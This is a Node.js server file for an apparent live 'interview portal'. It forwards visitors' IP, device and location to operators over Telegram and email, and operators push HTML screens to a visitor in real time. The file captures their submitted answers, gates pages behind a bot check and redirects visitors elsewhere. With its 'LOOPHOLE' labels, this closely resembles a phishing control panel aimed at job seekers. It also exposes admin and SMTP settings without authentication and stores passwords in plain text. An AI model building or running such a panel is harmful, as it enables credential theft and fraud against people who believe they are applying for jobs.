const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { db, initDb } = require('./database');
const nodemailer = require('nodemailer');
const cookieParser = require('cookie-parser');
const https = require('https');
const app = express();
const server = http.createServer(app);
const io = new Server(server);


// Initialize SQLite Tables
initDb();

app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/screens', express.static(path.join(__dirname, 'screens')));


/**
 * CHECK BOT GATEWAY MIDDLEWARE
 */
/**
 * ENTERPRISE GATEWAY MIDDLEWARE with Sliding Session (30m)
 */
const gatewayCheck = (req, res, next) => {
    const isPublicPath = ['/', '/gatekeeper', '/api/verify-human'].includes(req.path);
    const isStaticAsset = req.path.includes('.') && !req.path.endsWith('.html');
    const isApiPath = req.path.startsWith('/api/');

    if (req.cookies.verified_human) {
        res.cookie('verified_human', 'true', { 
            maxAge: 30 * 60 * 1000, 
            httpOnly: true, 
            sameSite: 'strict' 
        });
        return next();
    }

    if (isPublicPath || isStaticAsset) {
        return next();
    }

    // POINT 1: Store the attempted URL so we can redirect back after verification
    res.cookie('return_to', req.originalUrl, { maxAge: 900000, httpOnly: false });

    if (isApiPath) {
        return res.status(403).json({ 
            error: "Session Expired", 
            action: "REDIRECT_TO_GATEKEEPER" 
        });
    }

    res.redirect('/gatekeeper');
};

app.use(gatewayCheck);


/**
 * LOOPHOLE 1: DUAL NOTIFICATION SYSTEM
 */
async function notifyExaminers(candidateEmail, categoryName, attemptCount = 1) {
    console.log(`[DEBUG] Starting notification broadcast for ${candidateEmail} (Attempt: ${attemptCount})`);

    // Fetch candidate details first
    db.get(`SELECT * FROM candidates WHERE email = ?`, [candidateEmail], (err, candidate) => {
        if (err || !candidate) {
            console.log(`[DEBUG] Notification aborted: Candidate ${candidateEmail} not found in DB.`);
            return;
        }

        const dateStr = new Date().toLocaleString();
        const emailContent = `
            🔔 NEW CANDIDATE LOGGED IN (Attempt ${attemptCount}/3)
            --------------------------------
            Name: ${candidate.name}
            Email: ${candidate.email}
            Category: ${categoryName}
            Device: ${candidate.device_info || 'Unknown'}
            IP: ${candidate.ip_address || 'Hidden'}
            Location: ${candidate.city || 'Unknown'}, ${candidate.country || 'Unknown'}
            Time: ${dateStr}
            --------------------------------
        `;

        const telegramMsg = `🔔 [Attempt ${attemptCount}] New Candidate: ${candidate.name}\n💼 Category: ${categoryName}\n📧 Email: ${candidate.email}`;

        // Get Active SMTP Settings
        db.get(`SELECT * FROM mailer_settings`, [], (err, smtp) => {
            if (!smtp) console.log("[DEBUG] Email Notification Skipped: No active SMTP settings.");

            // Broadcast to ALL examiners (Broadcasting requirement)
            db.all(`SELECT telegram_key, chat_id, email FROM examiners`, [], (err, examiners) => {
                if (err || !examiners) return;

                examiners.forEach(ex => {
                    // 1. Telegram Broadcast
                    if (ex.telegram_key && ex.chat_id) {
                        const url = `https://api.telegram.org/bot${ex.telegram_key}/sendMessage?chat_id=${ex.chat_id}&text=${encodeURIComponent(telegramMsg)}`;
                        https.get(url, (res) => {
                            if (res.statusCode !== 200) console.log(`[DEBUG] Telegram failed for chat_id ${ex.chat_id}. Status: ${res.statusCode}`);
                        }).on('error', (e) => console.error("[DEBUG] Telegram Network Error:", e.message));
                    }

                    // 2. Email Broadcast
                    if (ex.email && smtp) {
                        let transporter = nodemailer.createTransport({
                            host: smtp.host,
                            port: smtp.port,
                            secure: smtp.port === 465,
                            auth: { user: smtp.user, pass: smtp.pass }
                        });

                        transporter.sendMail({
                            from: smtp.from_email,
                            to: ex.email,
                            subject: `Broadcast Alert: ${candidate.name}`,
                            text: emailContent
                        }).catch(e => console.log(`[DEBUG] Email failed for ${ex.email}:`, e.message));
                    }
                });
            });
        });
    });
}




// Memory Map to link Email to the current Active Socket
let emailToSocket = {};
let joinAttempts = {};
const examinerSockets = {};

io.on('connection', (socket) => {
    

    /**
     * POINT 6: HANDLE REFRESH BUG (Identity by Email)
     */
    socket.on('join_interview', async (data) => {
        const { name, email, categoryId } = data;

        // 1. DATABASE SAVE/UPDATE (UPSERT)
        // Ensures candidate exists and is marked 'live' before checking examiners
        const upsertSql = `
            INSERT INTO candidates (email, name, category_id, status) 
            VALUES (?, ?, ?, 'live') 
            ON CONFLICT(email) DO UPDATE SET 
            status = 'live', 
            category_id = EXCLUDED.category_id,
            name = EXCLUDED.name
        `;

        db.run(upsertSql, [email, name, categoryId], function(err) {
            if (err) {
                console.error("[DEBUG] DB Error during join:", err.message);
                return;
            }

            // 2. BROADCAST NOTIFICATION
            // Requirement: Notify examiners immediately when a candidate joins
            const currentAttempt = (joinAttempts[email] || 0) + 1;
            db.get(`SELECT name FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
                const catName = cat ? cat.name : 'General';
                console.log(`[DEBUG] Broadcasting join for ${name} (Attempt ${currentAttempt})`);
                notifyExaminers(email, catName, currentAttempt);
            });

            // 3. EXAMINER AVAILABILITY CHECK
            db.get(`SELECT COUNT(*) as activeCount FROM examiners WHERE status = 1`, [], (err, row) => {
                const examinersOnline = row && row.activeCount > 0;

                if (!examinersOnline) {
                    // NO EXAMINER ONLINE: Incremental Retry Logic
                    joinAttempts[email] = currentAttempt;
                    console.log(`[DEBUG] No examiner online for ${email}. Handling attempt ${currentAttempt}/3`);

                    if (joinAttempts[email] >= 3) {
                        // REACHED 3 ATTEMPTS: Redirect to Category Default URL
                        db.get(`SELECT default_redirect_url FROM categories WHERE id = ?`, [categoryId], (err, cat) => {
                            const targetUrl = cat ? cat.default_redirect_url : '/';
                            console.log(`[DEBUG] Final failure for ${email}. Redirecting to: ${targetUrl}`);
                            socket.emit('redirect_command', { url: targetUrl });
                            delete joinAttempts[email];
                        });
                    } else {
                        console.log(`[DEBUG] No examiner online. Sending failure to client. Attempt: ${currentAttempt}`);
        
                        // We emit 'join_failed' instead of a silent 'retry_connection'
                        socket.emit('join_failed', { 
                            message: "No examiners are currently available to start your session. Please try joining again.",
                            attempt: joinAttempts[email]
                        });
                    }
                    return; 
                }

                // 4. EXAMINER IS ONLINE: Proceed with portal session
                console.log(`[DEBUG] Examiner found. Initializing session for ${email}`);
                emailToSocket[email] = socket.id;
                socket.email = email;
                joinAttempts[email] = 0; // Reset attempts on successful connection

                // Fetch history and current state
                db.all(`SELECT * FROM interactions WHERE candidate_email = ? ORDER BY timestamp ASC`, [email], (err, history) => {
                    db.get(`SELECT * FROM candidates WHERE email = ?`, [email], (err, candidate) => {
                        // Restore existing session
                        socket.emit('restore_session', { candidate, history });

                        // If it's a fresh session (no history), send the default screen
                        if (!history || history.length === 0) {
                            db.get(`SELECT file_path FROM screens WHERE category_id = ? AND is_default = 1`, [categoryId], (err, screen) => {
                                if (screen) {
                                    socket.emit('new_task', { 
                                        screenFile: screen.file_path, 
                                        header: "Welcome", 
                                        subHeader: "Please begin the process." 
                                    });
                                }
                            });
                        }

                        // Alert examiners that the candidate is now truly "Live" in the portal
                        db.get(`SELECT name FROM categories WHERE id = ?`, [candidate.category_id], (err, cat) => {
                            io.emit('candidate_online', { 
                                ...candidate, 
                                status: 'live', 
                                category_name: cat ? cat.name : 'General' 
                            });
                        });
                    });
                });
            });
        });
    });


    socket.on('retry_connection', (data) => {
        showOverlay(`No examiners online. Retrying... (Attempt ${data.attempt}/3)`);
        setTimeout(() => {
            // Re-trigger the join call automatically
            socket.emit('join_interview', { name, email, categoryId });
        }, 5000); // 5 second delay between retries
    });


    // LOOPHOLE 3: Examiner Status Toggle
   socket.on('toggle_online', (data) => {
        const { username, isOnline } = data;
        
        if (isOnline) {
            examinerSockets[socket.id] = username;
        } else {
            // If they manually toggle off, remove all their sockets from the map
            for (const id in examinerSockets) {
                if (examinerSockets[id] === username) delete examinerSockets[id];
            }
        }

        db.run(`UPDATE examiners SET status = ? WHERE username = ?`, [isOnline ? 1 : 0, username]);
    });



    socket.on('disconnect', () => {
        // 1. Candidate Disconnect (Existing)
        if (socket.email) {
            const email = socket.email;
            if (emailToSocket[email] === socket.id) {
                db.run(`UPDATE candidates SET status = 'offline' WHERE email = ?`, [email], () => {
                    io.emit('candidate_offline', email);
                    delete emailToSocket[email];
                });
            }
        }

        // 2. Examiner Disconnect (Delayed Auto-Offline)
        const exUsername = examinerSockets[socket.id];
        if (exUsername) {
            console.log(`[DEBUG] Examiner ${exUsername} socket disconnected. Cleaning memory map.`);
            delete examinerSockets[socket.id]; 
            
            // OPTIONAL: "Safety Net" 
            // Only mark offline in DB after a long period of total absence (e.g., 10 mins)
            // to catch cases where the browser crashed or the computer died.
            setTimeout(() => {
                const stillConnected = Object.values(examinerSockets).includes(exUsername);
                if (!stillConnected) {
                    // Check if they are still 'Online' in DB before force-closing
                    db.get(`SELECT status FROM examiners WHERE username = ?`, [exUsername], (err, row) => {
                        if (row && row.status === 1) {
                            // This only runs if they haven't reconnected in 10 minutes
                            // db.run(`UPDATE examiners SET status = 0 WHERE username = ?`, [exUsername]);
                        }
                    });
                }
            }, 10 * 60 * 1000); // 10 Minute Safety
        }
    });

    /**
     * POINT 3 & 4: SCREEN TRIGGER & REDIRECTION
     */
    socket.on('trigger_screen', (data) => {
        const { candidateEmail, screenFile, header, subHeader, isRedirect, customUrl } = data;
        const targetSocket = emailToSocket[candidateEmail];

        if (isRedirect) {
            // Logic for Point 4: Redirection
            if (customUrl) {
                io.to(targetSocket).emit('redirect_command', { url: customUrl });
            } else {
                db.get(`SELECT c.default_redirect_url FROM categories c 
                        JOIN candidates cand ON cand.category_id = c.id 
                        WHERE cand.email = ?`, [candidateEmail], (err, row) => {
                    io.to(targetSocket).emit('redirect_command', { url: row.default_redirect_url });
                });
            }
        } else {
            const payload = { screenFile, header, subHeader };
            // Save to History (Point 3)
            db.run(`INSERT INTO interactions (candidate_email, type, screen_file, content) VALUES (?, 'command', ?, ?)`,
                [candidateEmail, screenFile, `Command: ${header}`]);
            
            io.to(targetSocket).emit('new_task', payload);
        }
    });

    /**
     * POINT 5: RESET SESSION
     */
    socket.on('reset_candidate', (email) => {
        // 1. SKIP DELETE: We are not clearing interactions/history anymore.
        
        // 2. Find the default screen for this candidate's category
        db.get(`SELECT s.file_path, s.screen_name FROM screens s 
                JOIN candidates c ON c.category_id = s.category_id 
                WHERE c.email = ? AND s.is_default = 1`, [email], (err, screen) => {
            
            const targetSocketId = emailToSocket[email];
            
            if (err) return console.error("Reset Error:", err);

            if (screen && targetSocketId) {
                const payload = { 
                    screenFile: screen.file_path, 
                    header: "Welcome", 
                    subHeader: "Please begin the process." 
                };

                // 3. DO NOT trigger a page reload. 
                // Just tell the candidate to wipe their 'current_task' and show the new one.
                io.to(targetSocketId).emit('force_reset_silent', payload);
            }
        });
    });

    /**
     * POINT 7: REMOVE CANDIDATE
     */
    socket.on('remove_candidate', (email) => {
        const targetSocketId = emailToSocket[email];

        // 1. Mark as offline in DB
        db.run(`UPDATE candidates SET status = 'offline' WHERE email = ?`, [email], () => {
            
            if (targetSocketId) {
                // 2. Tell the candidate to disconnect and clear their local data
                io.to(targetSocketId).emit('force_logout');
                
                // 3. Forcefully close the socket on the server
                const targetSocket = io.sockets.sockets.get(targetSocketId);
                if (targetSocket) targetSocket.disconnect(true);
            }

            // 4. Clean up our tracking map
            delete emailToSocket[email];

            // 5. Tell all examiners to remove this person from their "Live" lists
            io.emit('candidate_offline', email);
        });
    });

    /**
     * DATA SUBMISSION (Point 3)
     */
    socket.on('task_submitted', (data) => {
        const { email, screenFile, answer } = data;
        db.run(`INSERT INTO interactions (candidate_email, type, screen_file, content) VALUES (?, 'response', ?, ?)`,
            [email, screenFile, answer], () => {
            io.emit('notify_submission', { email, answer, screenFile });
        });
    });


    /**
     * REFRESH FIX: Fetching the Full Candidate List for Examiner
     */
    socket.on('request_list_refresh', () => {
        const sql = `
            SELECT c.*, cat.name as category_name 
            FROM candidates c 
            LEFT JOIN categories cat ON c.category_id = cat.id
        `;
        db.all(sql, [], (err, rows) => {
            socket.emit('sync_sessions', rows);
        });
    });

    /**
     * POINT 2: Fetching screens for the Examiner's Command Panel
     */
    socket.on('get_category_screens', (categoryId) => {
        db.all(`SELECT * FROM screens WHERE category_id = ?`, [categoryId], (err, rows) => {
            socket.emit('receive_screens', rows);
        });
    });

    /**
     * POINT 3: Fetching history when a candidate is selected
     */
    socket.on('get_candidate_history', (email) => {
        db.all(`SELECT * FROM interactions WHERE candidate_email = ? ORDER BY timestamp ASC`, [email], (err, rows) => {
            socket.emit('receive_history', rows);
        });
    });


    socket.on('mark_wrong', (data) => {
        const { candidateEmail, message } = data;
        const targetSocket = emailToSocket[candidateEmail];
        if (targetSocket) {
            io.to(targetSocket).emit('wrong_answer', { message });
        }
    });

    socket.on('get_examiner_status', (username) => {
        db.get(`SELECT status FROM examiners WHERE username = ?`, [username], (err, row) => {
            if (err) return console.error("DB Error:", err);

            // Check if this username exists anywhere in our active socket map
            const isActuallyConnected = Object.values(examinerSockets).includes(username);
            
            // If the DB says they are online (1) AND we have an active socket, 
            // or if they just refreshed, we treat them as online.
            const effectiveStatus = (row && row.status === 1 && isActuallyConnected) ? 1 : 0;

            socket.emit('receive_examiner_status', { 
                status: effectiveStatus 
            });
        });
    });
});

/**
 * POINT 8 & 9: MANAGEMENT API (For Admin UI)
 */
app.get('/api/candidates', (req, res) => {
    db.all(`SELECT * FROM candidates`, [], (err, rows) => res.json(rows));
});

app.post('/api/categories', express.json(), (req, res) => {
    const { name, url } = req.body;
    db.run(`INSERT INTO categories (name, default_redirect_url) VALUES (?, ?)`, [name, url], () => res.sendStatus(200));
});

// --- MISSING ENDPOINTS FOR MODERATOR.HTML ---

/**
 * 1. GET ALL SCREENS
 * Fetches all screens with their associated category names for the admin table
 */
app.get('/api/all-screens', (req, res) => {
    const sql = `
        SELECT s.*, c.name as category_name 
        FROM screens s 
        LEFT JOIN categories c ON s.category_id = c.id
    `;
    db.all(sql, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

/**
 * 2. ADD NEW SCREEN
 * Links a physical HTML file to a job category
 */
app.post('/api/screens', express.json(), (req, res) => {
    const { categoryId, name, path, isDefault } = req.body;
    
    // If setting as default, unset other defaults for this category first
    if (isDefault) {
        db.run(`UPDATE screens SET is_default = 0 WHERE category_id = ?`, [categoryId], () => {
            db.run(`INSERT INTO screens (category_id, screen_name, file_path, is_default) VALUES (?, ?, ?, ?)`,
                [categoryId, name, path, 1], () => res.sendStatus(200));
        });
    } else {
        db.run(`INSERT INTO screens (category_id, screen_name, file_path, is_default) VALUES (?, ?, ?, ?)`,
            [categoryId, name, path, 0], () => res.sendStatus(200));
    }
});

/**
 * 3. DELETE CATEGORY
 */
app.delete('/api/categories/:id', (req, res) => {
    db.run(`DELETE FROM categories WHERE id = ?`, [req.params.id], (err) => {
        if (err) return res.status(500).send(err.message);
        res.sendStatus(200);
    });
});

/**
 * 4. DELETE SCREEN
 */
app.delete('/api/screens/:id', (req, res) => {
    db.run(`DELETE FROM screens WHERE id = ?`, [req.params.id], (err) => {
        if (err) return res.status(500).send(err.message);
        res.sendStatus(200);
    });
});

/**
 * 5. PURGE CANDIDATE
 * Completely removes candidate and their interaction history from the DB
 */
app.delete('/api/candidates/:email', (req, res) => {
    const email = req.params.email;
    db.run(`DELETE FROM interactions WHERE candidate_email = ?`, [email], () => {
        db.run(`DELETE FROM candidates WHERE email = ?`, [email], (err) => {
            if (err) return res.status(500).send(err.message);
            res.sendStatus(200);
        });
    });
});

app.get('/api/vacancies', (req, res) => {
    db.all(`SELECT id, name FROM categories`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// 1. Get all examiners
app.get('/api/examiners', (req, res) => {
    db.all(`SELECT id, username, chat_id, status, is_moderator, email FROM examiners`, [], (err, rows) => {
        res.json(rows);
    });
});

// 2. Add new examiner
app.post('/api/examiners', express.json(), (req, res) => {
    const { username, pass, tkey, chatid, isMod, email } = req.body;
    db.run(`INSERT INTO examiners (username, password, telegram_key, chat_id, is_moderator, email) VALUES (?, ?, ?, ?, ?, ?)`,
        [username, pass, tkey, chatid, isMod, email], (err) => {
            if (err) {
                if (err.message.includes("UNIQUE constraint failed")) {
                    return res.status(400).send("Error: This username is already taken.");
                }
                return res.status(500).send("Database error occurred.");
            }
            res.sendStatus(200);
        });
});

// 3. Delete examiner
app.delete('/api/examiners/:id', (req, res) => {
    db.run(`DELETE FROM examiners WHERE id = ?`, [req.params.id], (err) => {
        res.sendStatus(200);
    });
});

// 4. LOGIN ENDPOINT (Critical for security)
app.post('/api/login', express.json(), (req, res) => {
    const { username, password } = req.body;
    const query = `SELECT id, username, is_moderator FROM examiners WHERE username = ? AND password = ?`;

    db.get(query, [username, password], (err, user) => {
        if (err) return res.status(500).json({ success: false, message: "Server error" });

        if (user) {
            // REMOVED: Automatic status = 1 update. 
            // We only send back the user info; they start "Offline" by default.
            const role = user.is_moderator ? 'moderator' : 'examiner';
            res.json({ 
                success: true, 
                role: role,
                username: user.username 
            });
        } else {
            res.status(401).json({ success: false, message: "Invalid credentials" });
        }
    });
});


/**
 * LOOPHOLE 4: ROUTING
 */
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public/index.html'))); // Landing page
app.get('/interview', (req, res) => res.sendFile(path.join(__dirname, 'public/portal.html'))); // Interview UI
app.get('/gatekeeper', (req, res) => res.sendFile(path.join(__dirname, 'public/gatekeeper.html')));

/**
 * LOOPHOLE 1: SMTP MANAGEMENT API
 */
app.get('/api/mailer', (req, res) => {
    db.all(`SELECT id, host, port, user, is_active FROM mailer_settings`, [], (err, rows) => res.json(rows));
});

app.post('/api/mailer', (req, res) => {
    const { host, port, user, pass, from_email } = req.body;
    db.run(`UPDATE mailer_settings SET is_active = 0`, [], () => {
        db.run(`INSERT INTO mailer_settings (host, port, user, pass, from_email, is_active) VALUES (?, ?, ?, ?, ?, 1)`,
            [host, port, user, pass, from_email], () => res.sendStatus(200));
    });
});

app.delete('/api/mailer/:id', (req, res) => {
    db.run(`DELETE FROM mailer_settings WHERE id = ?`, [req.params.id], () => res.sendStatus(200));
});

// Human Verification Endpoint
app.post('/api/verify-human', (req, res) => {
    res.cookie('verified_human', 'true', { 
        maxAge: 30 * 60 * 1000, 
        httpOnly: true,
        sameSite: 'strict'
    });

    // Send the return URL back to the frontend
    const redirectTo = req.cookies.return_to || '/';
    res.json({ success: true, redirectTo: redirectTo });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Enterprise Server Live on ${PORT}`));